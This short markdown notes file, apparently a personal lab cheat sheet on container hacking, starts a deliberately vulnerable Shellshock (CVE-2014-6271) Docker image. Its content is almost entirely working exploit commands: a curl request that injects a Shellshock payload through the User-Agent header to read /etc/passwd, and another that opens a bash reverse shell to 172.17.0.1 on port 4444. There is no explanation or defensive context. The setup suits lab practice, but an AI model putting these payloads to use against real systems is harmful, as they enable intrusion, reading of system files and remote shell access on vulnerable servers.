# Container Security

## Hacking 

### images 
Vulanrable image (shell-shoked)
```
docker run --rm -it -p 8080:80 vulnerables/cve-2014-6271
```

### exploits
Get password
```
curl -H "user-agent: () { : ;} ; echo; echo; /bin/bash -c 'cat /etc/passwd' " http://localhost:8080/cgi-bin/vulnerable
```
Reverse shell
```
curl -H "user-agent: () { : ;} ; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1' " http://localhost:8080/cgi-bin/vulnerable
```

